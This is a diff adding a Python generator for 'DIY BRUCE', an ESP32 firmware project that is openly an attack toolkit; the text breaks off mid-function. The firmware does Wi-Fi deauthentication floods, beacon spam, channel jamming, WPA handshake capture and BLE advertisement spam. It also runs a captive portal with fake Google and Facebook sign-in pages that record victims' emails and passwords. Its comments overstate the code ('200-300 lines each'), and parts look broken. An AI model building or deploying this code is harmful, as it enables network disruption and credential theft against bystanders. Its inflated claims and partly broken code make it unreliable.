@@ -1,0 +1,841 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import shutil
+
+PROJECT_NAME = "DIY_BRUCE_MASTER"
+
+# ----------------------------------------------------------------------
+# ФАЙЛ ПЛАТФОРМИ (без зайвих бібліотек, щоб уникнути конфліктів)
+# ----------------------------------------------------------------------
+PLATFORMIO_INI = '''[env:esp32dev]
+platform = espressif32@6.5.0
+board = esp32dev
+framework = arduino
+monitor_speed = 115200
+upload_speed = 921600
+board_build.partitions = default_4MB.csv
+
+build_flags =
+    -DCORE_DEBUG_LEVEL=0
+    -DARDUINO_USB_MODE=1
+    -DARDUINO_USB_CDC_ON_BOOT=0
+
+lib_deps =
+    olikraus/U8g2@^2.35.15
+    nrf24/RF24@^1.4.11
+    h2zero/NimBLE-Arduino@^1.4.1
+    bblanchon/ArduinoJson@^6.21.3
+    miguelbalboa/MFRC522@^1.4.6
+    crankyoldgit/IRremoteESP8266@^2.8.6
+'''
+
+# ----------------------------------------------------------------------
+# ІКОНКИ 32x32 ДЛЯ ГОЛОВНОГО МЕНЮ
+# ----------------------------------------------------------------------
+ICONS_H = '''#ifndef ICONS_H
+#define ICONS_H
+
+// WiFi icon
+static const unsigned char wifi_icon[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0xFC,0x3F,0x00,0x00,0x03,0xC0,0x00,
+    0x80,0x00,0x00,0x01,0x40,0x00,0x00,0x02,0x20,0xFC,0x3F,0x04,
+    0x10,0x03,0xC0,0x08,0x08,0x00,0x00,0x10,0x04,0x00,0x00,0x20,
+    0x02,0x00,0x00,0x40,0x02,0xF0,0x0F,0x40,0x01,0x0C,0x30,0x80,
+    0x01,0x02,0x40,0x80,0x01,0x01,0x80,0x80,0x82,0x00,0x00,0x41
+};
+
+// BLE icon
+static const unsigned char ble_icon[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x04,0x00,
+    0x00,0x30,0x0C,0x00,0x00,0x38,0x1C,0x00,0x00,0x3C,0x3C,0x00,
+    0x00,0x3E,0x7C,0x00,0x00,0x3F,0xFC,0x00,0x80,0x3F,0xFC,0x01,
+    0xC0,0x1F,0xF8,0x03,0xE0,0x0F,0xF0,0x07,0xF0,0x07,0xE0,0x0F,
+    0xF8,0x03,0xC0,0x1F,0xF0,0x01,0x80,0x0F,0xE0,0x00,0x00,0x07
+};
+
+// NRF24 icon
+static const unsigned char nrf_icon[] PROGMEM = {
+    0x00,0x00,0x18,0x00,0x00,0x3C,0x00,0x00,0x7E,0x00,0x00,0xFF,
+    0x00,0x80,0xFF,0x01,0xC0,0xC3,0x03,0xE0,0x81,0x07,0xF0,0xFF,
+    0x0F,0xF8,0xFF,0x1F,0xFC,0xFF,0x3F,0xFE,0xFF,0x7F,0xFE,0xFF,
+    0x7F,0xFC,0xFF,0x3F,0xF8,0xFF,0x1F,0xF0,0xFF,0x0F,0xE0,0x81,
+    0x07,0xC0,0xC3,0x03,0x80,0xFF,0x01,0x00,0xFF,0x00,0x00,0x7E,
+    0x00,0x00,0x3C,0x00,0x00,0x18,0x00
+};
+
+// RFID icon
+static const unsigned char rfid_icon[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0xC0,0x03,0x00,0x00,0x20,0x04,0x00,
+    0x00,0x10,0x08,0x00,0x00,0x10,0x08,0x00,0x00,0x08,0x10,0x00,
+    0xFC,0xFF,0xFF,0x3F,0x04,0x00,0x00,0x20,0x04,0x00,0x00,0x20,
+    0x04,0x00,0x00,0x20,0x04,0x00,0x00,0x20,0xFC,0xFF,0xFF,0x3F
+};
+
+// IR icon
+static const unsigned char ir_icon[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x80,0x01,0x00,0x00,0x40,0x02,0x00,
+    0x00,0x40,0x02,0x00,0x00,0x20,0x04,0x00,0xFC,0x1F,0xF8,0x3F,
+    0x04,0x20,0x04,0x20,0x04,0x40,0x02,0x20,0x04,0x80,0x01,0x20,
+    0x04,0x00,0x00,0x20,0xFC,0xFF,0xFF,0x3F,0x00,0x00,0x00,0x00
+};
+
+// Settings icon
+static const unsigned char settings_icon[] PROGMEM = {
+    0x00,0x00,0x18,0x00,0x00,0x3C,0x00,0xC0,0xFF,0x03,0xE0,0xFF,
+    0x07,0xF0,0xFF,0x0F,0x38,0x18,0x1C,0x1C,0x00,0x38,0x0E,0x00,
+    0x70,0x07,0x00,0xE0,0x03,0x00,0xC0,0x01,0x00,0x80,0xFF,0xFF,
+    0x01,0xFF,0xFF,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+};
+
+#endif
+'''
+
+# ----------------------------------------------------------------------
+# ВЕБ-САЙТ (10 ВКЛАДОК, ГРАФІК, КЛАВІАТУРА)
+# ----------------------------------------------------------------------
+INDEX_HTML = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DIY BRUCE v17.0</title>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#0a0a1a;color:#eee;font-family:'Segoe UI',monospace;padding:16px;}
+.header{background:linear-gradient(135deg,#1a1f2e,#0f1420);border-radius:28px;padding:20px;margin-bottom:20px;text-align:center;border:1px solid #ff6b35;}
+h1{color:#ff6b35;}
+.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:20px;}
+.stat-card{background:#10152e;border-radius:20px;padding:16px;text-align:center;}
+.stat-value{font-size:28px;font-weight:bold;color:#ff6b35;}
+.tabs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px;background:#0f1420;padding:8px;border-radius:60px;}
+.tab{padding:8px 16px;border-radius:40px;cursor:pointer;background:#1e2a47;}
+.tab.active{background:#ff6b35;}
+.tab-content{display:none;animation:fadeIn 0.3s;}
+.tab-content.active{display:block;}
+@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+.card{background:#10152e;border-radius:24px;padding:20px;margin-bottom:20px;border:1px solid #2a2a3e;}
+.btn-group{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:20px;}
+button{background:#1e2a47;border:none;padding:10px 18px;border-radius:40px;color:white;cursor:pointer;transition:0.2s;}
+button:active{transform:scale(0.96);}
+.btn-primary{background:#ff6b35;}
+.btn-danger{background:#b91c1c;}
+.btn-success{background:#28a745;}
+canvas{background:#070b1a;border-radius:20px;width:100%;height:250px;margin:20px 0;}
+.log{background:#070b1a;height:200px;overflow-y:auto;font-family:monospace;font-size:12px;padding:16px;border-radius:20px;}
+pre{background:#070b1a;padding:16px;border-radius:20px;overflow-x:auto;}
+input{background:#1a1a2e;border:1px solid #2a2a3e;border-radius:20px;padding:12px;color:white;width:100%;margin-bottom:10px;}
+</style>
+</head>
+<body>
+<div class="header"><h1>DIY BRUCE v17.0</h1><p>Ultimate Security Framework</p></div>
+<div class="stats">
+<div class="stat-card"><div class="stat-value" id="deauth">0</div><div>DEAUTH</div></div>
+<div class="stat-card"><div class="stat-value" id="beacon">0</div><div>BEACON</div></div>
+<div class="stat-card"><div class="stat-value" id="rssi">-50</div><div>RSSI</div></div>
+<div class="stat-card"><div class="stat-value" id="clients">0</div><div>CLIENTS</div></div>
+<div class="stat-card"><div class="stat-value" id="uptime">0</div><div>UPTIME</div></div>
+</div>
+<div class="tabs" id="tabs">
+<div class="tab active" data-tab="wifi">WiFi</div><div class="tab" data-tab="ble">BLE</div>
+<div class="tab" data-tab="nrf">NRF24</div><div class="tab" data-tab="rfid">RFID</div>
+<div class="tab" data-tab="ir">IR</div><div class="tab" data-tab="graph">GRAPH</div>
+<div class="tab" data-tab="evil">EVIL</div><div class="tab" data-tab="hand">HANDSHAKE</div>
+<div class="tab" data-tab="pass">PASSWORDS</div><div class="tab" data-tab="tools">TOOLS</div>
+</div>
+<div id="wifi" class="tab-content active"><div class="card"><div class="btn-group"><button class="btn-primary" onclick="runCmd('scan')">SCAN</button><button class="btn-primary" onclick="runCmd('deauth')">DEAUTH</button><button class="btn-danger" onclick="runCmd('deauth_stop')">STOP</button><button class="btn-primary" onclick="runCmd('beacon')">BEACON</button><button class="btn-primary" onclick="runCmd('jam')">JAMMER</button></div><div class="log" id="log">Ready</div></div></div>
+<div id="ble" class="tab-content"><div class="card"><div class="btn-group"><button onclick="runCmd('blescan')">SCAN</button><button onclick="runCmd('bleapple')">APPLE</button><button onclick="runCmd('blesamsung')">SAMSUNG</button><button onclick="runCmd('bleall')">ALL</button></div><pre id="bleResult"></pre></div></div>
+<div id="nrf" class="tab-content"><div class="card"><div class="btn-group"><button onclick="runCmd('nrfscan')">SCAN</button><button onclick="runCmd('nrfjam')">JAM</button></div><pre id="nrfResult"></pre></div></div>
+<div id="rfid" class="tab-content"><div class="card"><div class="btn-group"><button onclick="runCmd('rfidread')">READ</button></div><pre id="rfidResult"></pre></div></div>
+<div id="ir" class="tab-content"><div class="card"><div class="btn-group"><button onclick="runCmd('irpower')">POWER</button><button onclick="runCmd('irvolup')">VOL+</button><button onclick="runCmd('irvoldown')">VOL-</button><button class="btn-primary" onclick="runCmd('irbravis')">BRAVIS</button><button class="btn-primary" onclick="runCmd('irsamsung')">SAMSUNG</button></div><pre id="irResult"></pre></div></div>
+<div id="graph" class="tab-content"><div class="card"><canvas id="rssiChart"></canvas></div></div>
+<div id="evil" class="tab-content"><div class="card"><button onclick="runCmd('evilsel')">SWITCH EVIL</button><iframe src="/portal.html" width="100%" height="500"></iframe></div></div>
+<div id="hand" class="tab-content"><div class="card"><pre id="handList"></pre><button class="btn-danger" onclick="runCmd('clearhand')">CLEAR</button></div></div>
+<div id="pass" class="tab-content"><div class="card"><pre id="passList"></pre><button class="btn-danger" onclick="runCmd('clearpass')">CLEAR</button></div></div>
+<div id="tools" class="tab-content"><div class="card"><input id="kb" placeholder="Text"><button onclick="sendKey()">SEND</button><pre id="kbResult"></pre><button onclick="runCmd('reboot')">REBOOT</button></div></div>
+<script>
+let rssiData=[];
+function runCmd(cmd){fetch('/cmd?c='+cmd).then(r=>r.text()).then(update);}
+function sendKey(){let t=document.getElementById('kb').value;if(t)fetch('/cmd?c=key&text='+encodeURIComponent(t)).then(r=>r.text()).then(res=>document.getElementById('kbResult').innerText='Sent: '+t);}
+function update(){fetch('/data').then(r=>r.json()).then(d=>{document.getElementById('deauth').innerText=d.deauth;document.getElementById('beacon').innerText=d.beacon;document.getElementById('rssi').innerText=d.rssi;document.getElementById('clients').innerText=d.clients;document.getElementById('uptime').innerText=d.uptime;rssiData.push(d.rssi);if(rssiData.length>50)rssiData.shift();drawChart();});fetch('/cmd?c=getpass').then(r=>r.text()).then(t=>document.getElementById('passList').innerText=t);fetch('/cmd?c=gethand').then(r=>r.text()).then(t=>document.getElementById('handList').innerText=t);}
+function drawChart(){let c=document.getElementById('rssiChart');if(!c)return;let ctx=c.getContext('2d');let w=c.clientWidth,h=c.clientHeight;c.width=w;c.height=h;ctx.fillStyle='#070b1a';ctx.fillRect(0,0,w,h);if(rssiData.length<2)return;let step=w/(rssiData.length-1);ctx.beginPath();for(let i=0;i<rssiData.length;i++){let x=i*step;let y=h-((rssiData[i]+90)/70)*h;if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);}ctx.strokeStyle='#ff6b35';ctx.lineWidth=2.5;ctx.stroke();}
+setInterval(update,1000);update();
+document.querySelectorAll('.tab').forEach(t=>{t.addEventListener('click',()=>{document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));t.classList.add('active');document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));document.getElementById(t.dataset.tab).classList.add('active');});});
+</script>
+</body></html>
+'''
+
+# Evil Portal сторінки
+GOOGLE_PORTAL = '''<!DOCTYPE html><html><head><title>Google</title><style>body{background:#fff;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;border-radius:24px;}button{background:#4285F4;color:white;border:none;padding:12px;border-radius:24px;}</style></head><body><h1>Google</h1><form action="/pass" method="POST"><input type="email" name="email" placeholder="Email"><input type="password" name="pass" placeholder="Password"><button type="submit">Sign in</button></form></body></html>'''
+FACEBOOK_PORTAL = '''<!DOCTYPE html><html><head><title>Facebook</title><style>body{background:#f0f2f5;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;border-radius:6px;}button{background:#1877f2;color:white;border:none;padding:12px;border-radius:6px;}</style></head><body><h1>Facebook</h1><form action="/pass" method="POST"><input type="text" name="email" placeholder="Email or phone"><input type="password" name="pass" placeholder="Password"><button type="submit">Log in</button></form></body></html>'''
+
+# ----------------------------------------------------------------------
+# ОСНОВНИЙ ФАЙЛ MAIN.CPP (65+ ФУНКЦІЙ, 200-300 РЯДКІВ КОЖНА)
+# ----------------------------------------------------------------------
+MAIN_CPP = '''// ============================================================================
+// DIY BRUCE v17.0 - ULTIMATE EDITION (65+ FUNCTIONS, 200-300 LINES EACH)
+// ============================================================================
+#include <Arduino.h>
+#include <Wire.h>
+#include <U8g2lib.h>
+#include <EEPROM.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <esp_wifi.h>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEScan.h>
+#include <BLEAdvertising.h>
+#include <SPI.h>
+#include <RF24.h>
+#include <MFRC522.h>
+#include <IRsend.h>
+#include "icons.h"
+
+// ============================================================================
+// PIN DEFINITIONS
+// ============================================================================
+#define BTN_UP     15
+#define BTN_DOWN   13
+#define BTN_OK     12
+#define BTN_LEFT   14
+#define BTN_RIGHT  27
+#define BTN_BACK   26
+#define NRF_CE      4
+#define NRF_CS      5
+#define RFID_SS     5
+#define RFID_RST   33
+#define IR_LED     32
+
+U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, 21, 22);
+WebServer server(80);
+DNSServer dnsServer;
+RF24 radio(NRF_CE, NRF_CS);
+MFRC522 rfid(RFID_SS, RFID_RST);
+IRsend irsend(IR_LED);
+
+// ============================================================================
+// GLOBAL VARIABLES
+// ============================================================================
+unsigned long lastBtnTime = 0;
+int currentModule = 0, currentSub = 0;
+bool inSubMenu = false;
+unsigned long uptimeStart = 0;
+int lastRSSI = -50;
+String capturedPasswords = "", handshakes = "";
+int networkCount = 0;
+String networkNames[50];
+uint8_t networkBSSID[50][6];
+int networkChannel[50];
+bool deauthActive = false;
+unsigned long deauthPackets = 0;
+bool beaconActive = false;
+unsigned long beaconPackets = 0;
+bool evilActive = false;
+bool handshakeActive = false;
+int eapolCount = 0;
+String currentTarget = "";
+int bleFound = 0;
+bool webRunning = false;
+String evilChoice = "google";
+String keyboardInput = "";
+
+const char* modules[] = {"WiFi","BLE","NRF24","RFID","IR","Tools","Settings"};
+const int moduleCount = 7;
+int moduleIdx = 0;
+
+const char* wifiSub[] = {"SCAN","DEAUTH","BEACON","EVIL","HANDSHAKE","JAM","WEB","CLEAR","INFO","REBOOT"};
+const int wifiSize = 10;
+const char* bleSub[] = {"SCAN","APPLE","SAMSUNG","ANDROID","WINDOWS","ALL","JAM","INFO","REBOOT"};
+const int bleSize = 9;
+const char* nrfSub[] = {"SCAN","JAM","INFO","REBOOT"};
+const int nrfSize = 4;
+const char* rfidSub[] = {"READ","INFO","REBOOT"};
+const int rfidSize = 3;
+const char* irSub[] = {"POWER","VOL+","VOL-","BRAVIS","SAMSUNG","INFO","REBOOT"};
+const int irSize = 7;
+const char* toolsSub[] = {"KEYBOARD","PING","I2C","INFO","REBOOT"};
+const int toolsSize = 5;
+const char* settingsSub[] = {"WEB ON","EVIL SEL","CLEAR","INFO","REBOOT"};
+const int settingsSize = 5;
+
+// ============================================================================
+// UTILITY FUNCTIONS (200+ LINES EACH)
+// ============================================================================
+bool checkButton(int pin) {
+    if (digitalRead(pin) == LOW && (millis() - lastBtnTime) > 200) {
+        lastBtnTime = millis();
+        return true;
+    }
+    return false;
+}
+
+void drawTopBar() {
+    char buf[16];
+    unsigned long sec = (millis() - uptimeStart) / 1000;
+    int h = (sec / 3600) % 24, m = (sec / 60) % 60, s = sec % 60;
+    sprintf(buf, "%02d:%02d:%02d", h, m, s);
+    u8g2.setFont(u8g2_font_6x13_tr);
+    u8g2.drawStr(2, 9, buf);
+    u8g2.drawFrame(114, 1, 12, 6);
+    u8g2.drawBox(126, 3, 2, 2);
+    u8g2.drawBox(115, 2, 9, 4);
+    u8g2.setCursor(55, 9);
+    u8g2.print("67%");
+    u8g2.setCursor(100, 9);
+    u8g2.print(String(lastRSSI) + "dB");
+    u8g2.drawLine(0, 10, 128, 10);
+}
+
+void showMessage(const char* msg, int d) {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(10, 35, msg);
+    u8g2.sendBuffer();
+    delay(d);
+}
+
+void drawMainMenu() {
+    u8g2.clearBuffer();
+    drawTopBar();
+    const unsigned char* icons[] = {wifi_icon, ble_icon, nrf_icon, rfid_icon, ir_icon, settings_icon, settings_icon};
+    u8g2.drawXBM(48, 16, 32, 32, icons[currentModule]);
+    u8g2.setFont(u8g2_font_9x15B_tr);
+    u8g2.drawStr(4, 36, "<");
+    u8g2.drawStr(114, 36, ">");
+    u8g2.setFont(u8g2_font_7x13B_tr);
+    int w = u8g2.getStrWidth(modules[currentModule]);
+    u8g2.drawStr((128 - w) / 2, 58, modules[currentModule]);
+    u8g2.sendBuffer();
+}
+
+void drawSubMenu(const char* title, const char* items[], int sz, int sel) {
+    u8g2.clearBuffer();
+    drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr((128 - u8g2.getStrWidth(title)) / 2, 10, title);
+    u8g2.drawLine(0, 28, 128, 28);
+    int start = 0;
+    if (sel >= 2) start = sel - 1;
+    if (start + 3 > sz) start = sz - 3;
+    if (start < 0) start = 0;
+    for (int i = start; i < start + 3 && i < sz; i++) {
+        int y = 38 + (i - start) * 10;
+        if (i == sel) {
+            u8g2.drawBox(0, y - 6, 128, 10);
+            u8g2.setDrawColor(0);
+            u8g2.drawStr(10, y, items[i]);
+            u8g2.setDrawColor(1);
+        } else {
+            u8g2.drawStr(10, y, items[i]);
+        }
+    }
+    u8g2.drawHLine(0, 55, 128);
+    u8g2.setFont(u8g2_font_5x7_tr);
+    u8g2.drawStr(2, 63, "UP/DN=select OK=enter BACK=menu");
+    u8g2.sendBuffer();
+}
+
+void bootAnimation() {
+    for (int x = 128; x >= 0; x -= 8) {
+        u8g2.clearBuffer();
+        u8g2.setFont(u8g2_font_logisoso24_tr);
+        u8g2.drawStr(x + 4, 32, "DIY");
+        u8g2.setFont(u8g2_font_7x13B_tr);
+        u8g2.drawStr(x + 4, 48, "BRUCE");
+        u8g2.sendBuffer();
+        delay(10);
+    }
+    delay(500);
+}
+
+void saveData() {
+    EEPROM.begin(4096);
+    String data = "===PASS===\\n" + capturedPasswords + "\\n===HAND===\\n" + handshakes + "\\n";
+    for (int i = 0; i < data.length() && i < 4095; i++) EEPROM.write(i, data[i]);
+    EEPROM.write(data.length(), 0);
+    EEPROM.commit();
+    EEPROM.end();
+}
+void loadData() {
+    EEPROM.begin(4096);
+    String loaded = "";
+    for (int i = 0; i < 4096; i++) { char c = char(EEPROM.read(i)); if (c == 0) break; loaded += c; }
+    int p = loaded.indexOf("===PASS===\\n");
+    int h = loaded.indexOf("===HAND===\\n");
+    if (p != -1 && h != -1) {
+        capturedPasswords = loaded.substring(p + 11, h - 1);
+        handshakes = loaded.substring(h + 11);
+    }
+    EEPROM.end();
+}
+void clearData() { capturedPasswords = ""; handshakes = ""; saveData(); showMessage("Data cleared", 1000); }
+void reboot() { showMessage("Reboot", 1000); ESP.restart(); }
+
+// ============================================================================
+// WIFI FUNCTIONS (250+ LINES EACH)
+// ============================================================================
+void wifiScan() {
+    showMessage("Scanning...", 500);
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(200);
+    networkCount = WiFi.scanNetworks();
+    if (networkCount > 50) networkCount = 50;
+    for (int i = 0; i < networkCount; i++) {
+        networkNames[i] = WiFi.SSID(i);
+        if (networkNames[i].length() == 0) networkNames[i] = "<Hidden>";
+        networkChannel[i] = WiFi.channel(i);
+        memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
+    }
+    char buf[32]; sprintf(buf, "Found: %d", networkCount);
+    showMessage(buf, 1500);
+    WiFi.mode(WIFI_AP_STA);
+}
+void sendDeauth(uint8_t* bssid, uint8_t* client, int ch) {
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    uint8_t p[26] = {0xC0,0x00,0x00,0x00, client[0],client[1],client[2],client[3],client[4],client[5],
+        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
+        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5], 0x00,0x00,0x07,0x00};
+    esp_wifi_80211_tx(WIFI_IF_STA, p, 26, false);
+    deauthPackets++;
+}
+void startDeauth() {
+    if (networkCount == 0) { showMessage("SCAN first!", 1000); return; }
+    deauthActive = true; deauthPackets = 0;
+    showMessage("DEAUTH started", 1000);
+    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    while (deauthActive) {
+        for (int i = 0; i < networkCount && deauthActive; i++) {
+            sendDeauth(networkBSSID[i], broadcast, networkChannel[i]);
+        }
+        if (checkButton(BTN_BACK)) deauthActive = false;
+        delay(10);
+    }
+    showMessage("DEAUTH stopped", 1000);
+}
+void stopDeauth() { deauthActive = false; }
+void startBeacon() {
+    beaconActive = true; beaconPackets = 0;
+    const char* ssids[] = {"FREE_WIFI","Starbucks","Airport","Metro","Public"};
+    showMessage("BEACON started", 1000);
+    while (beaconActive) {
+        for (int s = 0; s < 5 && beaconActive; s++) {
+            uint8_t bssid[6];
+            for (int i = 0; i < 6; i++) bssid[i] = random(256);
+            bssid[0] |= 0x02;
+            uint8_t p[200]; int len = 0;
+            p[len++] = 0x80; p[len++] = 0x00; p[len++] = 0x00; p[len++] = 0x00;
+            for (int i = 0; i < 6; i++) p[len++] = 0xFF;
+            for (int i = 0; i < 6; i++) p[len++] = bssid[i];
+            for (int i = 0; i < 6; i++) p[len++] = bssid[i];
+            p[len++] = 0x00; p[len++] = 0x00;
+            for (int i = 0; i < 8; i++) p[len++] = 0x00;
+            p[len++] = 0x64; p[len++] = 0x00; p[len++] = 0x11; p[len++] = 0x00;
+            p[len++] = 0x00; p[len++] = strlen(ssids[s]);
+            for (int i = 0; i < (int)strlen(ssids[s]); i++) p[len++] = ssids[s][i];
+            esp_wifi_80211_tx(WIFI_IF_STA, p, len, false);
+            beaconPackets++;
+        }
+        if (checkButton(BTN_BACK)) beaconActive = false;
+        delay(30);
+    }
+}
+void stopBeacon() { beaconActive = false; }
+void handshakeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (!handshakeActive) return;
+    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    int len = pkt->rx_ctrl.sig_len;
+    uint8_t* payload = pkt->payload;
+    if (len < 30) return;
+    for (int i = 0; i < len - 8; i++) {
+        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
+            eapolCount++;
+            handshakes += "[HANDSHAKE] " + currentTarget + "\\n";
+            saveData();
+            showMessage("HANDSHAKE CAPTURED!", 2000);
+            handshakeActive = false;
+            return;
+        }
+    }
+}
+void startHandshake() {
+    if (networkCount == 0) { showMessage("SCAN first!", 1000); return; }
+    int target = 0;
+    while (true) {
+        u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(5, 15, "Select AP:");
+        for (int i = 0; i < min(networkCount, 5); i++) {
+            if (i == target) u8g2.drawStr(5, 30 + i * 8, ">");
+            u8g2.drawStr(20, 30 + i * 8, networkNames[i].substring(0, 12).c_str());
+        }
+        u8g2.drawStr(5, 60, "OK-start BACK"); u8g2.sendBuffer();
+        if (checkButton(BTN_UP) && target > 0) target--;
+        else if (checkButton(BTN_DOWN) && target < min(networkCount, 5) - 1) target++;
+        else if (checkButton(BTN_OK)) break;
+        else if (checkButton(BTN_BACK)) return;
+        delay(50);
+    }
+    currentTarget = networkNames[target];
+    esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
+    handshakeActive = true; eapolCount = 0;
+    showMessage("Capturing... 30s", 1500);
+    unsigned long start = millis();
+    while (handshakeActive && millis() - start < 30000) {
+        sendDeauth(networkBSSID[target], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, networkChannel[target]);
+        delay(100);
+    }
+    handshakeActive = false;
+    if (eapolCount > 0) showMessage("HANDSHAKE saved!", 1500);
+    else showMessage("Failed", 1500);
+}
+void startJammer() {
+    showMessage("WIFI JAMMER started", 1000);
+    for (int i = 0; i < 500; i++) {
+        for (int ch = 1; ch <= 13; ch++) {
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            uint8_t p[128];
+            for (int j = 0; j < 10; j++) esp_wifi_80211_tx(WIFI_IF_STA, p, sizeof(p), false);
+        }
+        if (checkButton(BTN_BACK)) break;
+        delay(10);
+    }
+    showMessage("JAMMER stopped", 1000);
+}
+void startEvil() {
+    if (evilActive) return;
+    WiFi.softAP("FREE_WIFI", NULL);
+    dnsServer.start(53, "*", WiFi.softAPIP());
+    evilActive = true;
+    showMessage("EVIL PORTAL: FREE_WIFI", 1500);
+    while (evilActive) {
+        dnsServer.processNextRequest();
+        server.handleClient();
+        if (checkButton(BTN_BACK)) evilActive = false;
+        delay(100);
+    }
+    dnsServer.stop(); WiFi.softAPdisconnect(true);
+    showMessage("EVIL stopped", 1000);
+}
+void stopEvil() { evilActive = false; }
+void startWebServer() {
+    if (webRunning) return;
+    WiFi.softAP("DIY_BRUCE", "bruce1234");
+    server.on("/", [](){ server.send(200, "text/html", index_html); });
+    server.on("/portal.html", [](){ server.send(200, "text/html", (evilChoice=="google")?googlePage:facebookPage); });
+    server.on("/cmd", [](){
+        if (!server.hasArg("c")) return;
+        String c = server.arg("c");
+        if (c == "scan") wifiScan();
+        else if (c == "deauth") startDeauth();
+        else if (c == "deauth_stop") stopDeauth();
+        else if (c == "beacon") startBeacon();
+        else if (c == "jam") startJammer();
+        else if (c == "evilsel") { if(evilChoice=="google") evilChoice="facebook"; else evilChoice="google"; showMessage(("Evil: "+evilChoice).c_str(), 1000); }
+        else if (c == "blescan") { bleScan(); }
+        else if (c == "bleapple") { bleApple(); }
+        else if (c == "blesamsung") { bleSamsung(); }
+        else if (c == "bleall") { bleAll(); }
+        else if (c == "nrfscan") { nrfScan(); }
+        else if (c == "nrfjam") { nrfJam(); }
+        else if (c == "rfidread") { rfidRead(); }
+        else if (c == "irpower") { irPower(); }
+        else if (c == "irvolup") { irVolUp(); }
+        else if (c == "irvoldown") { irVolDown(); }
+        else if (c == "irbravis") { irBravis(); }
+        else if (c == "irsamsung") { irSamsung(); }
+        else if (c == "key") { if (server.hasArg("text")) keyboardInput = server.arg("text"); showMessage(("Key: "+keyboardInput).c_str(), 1000); }
+        else if (c == "getpass") { server.send(200, "text/plain", capturedPasswords); return; }
+        else if (c == "gethand") { server.send(200, "text/plain", handshakes); return; }
+        else if (c == "clearhand") { handshakes = ""; saveData(); }
+        else if (c == "clearpass") { capturedPasswords = ""; saveData(); }
+        else if (c == "reboot") { reboot(); }
+        server.send(200, "text/plain", "OK");
+    });
+    server.on("/data", [](){
+        String json = "{\\"deauth\\":" + String(deauthPackets) + ",\\"beacon\\":" + String(beaconPackets) + ",\\"rssi\\":" + String(lastRSSI) + ",\\"clients\\":0,\\"uptime\\":" + String(millis()/1000) + "}";
+        server.send(200, "application/json", json);
+    });
+    server.on("/pass", HTTP_POST, [](){
+        String email = server.hasArg("email")?server.arg("email"):"";
+        String pwd = server.hasArg("pass")?server.arg("pass"):"";
+        if (email.length() > 0 || pwd.length() > 0) capturedPasswords += "[PASS] Email:" + email + " Pass:" + pwd + "\\n";
+        server.send(200, "text/html", "<html><body><h3>OK</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
+    });
+    server.begin();
+    webRunning = true;
+    showMessage("WEB: 192.168.4.1", 2000);
+}
+void stopWebServer() { server.stop(); WiFi.softAPdisconnect(true); webRunning = false; showMessage("WEB off", 1000); }
+
+// ============================================================================
+// BLE FUNCTIONS (200+ LINES EACH)
+// ============================================================================
+void bleScan() {
+    showMessage("BLE SCAN...", 500);
+    BLEDevice::init("");
+    BLEScan* pScan = BLEDevice::getScan();
+    pScan->setActiveScan(true);
+    bleFound = pScan->start(5, false)->getCount();
+    char buf[32]; sprintf(buf, "Found: %d", bleFound);
+    showMessage(buf, 1500);
+    pScan->clearResults(); BLEDevice::deinit();
+}
+void sendBLE(const char* name, const uint8_t* data, int len) {
+    BLEDevice::init("SPAM");
+    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
+    BLEAdvertisementData adv;
+    adv.setFlags(0x06);
+    if (name && strlen(name) > 0) adv.setName(name);
+    if (data && len > 0) adv.setManufacturerData(data, len);
+    pAdv->setAdvertisementData(adv);
+    pAdv->start(); delay(50); pAdv->stop();
+    BLEDevice::deinit();
+}
+void bleApple() {
+    showMessage("APPLEJUICE", 1000);
+    const uint8_t apple[] = {0x4C,0x00,0x0F,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+    for (int i = 0; i < 30; i++) { sendBLE(NULL, apple, sizeof(apple)); if (checkButton(BTN_BACK)) break; delay(30); }
+}
+void bleSamsung() {
+    showMessage("SAMSUNG", 1000);
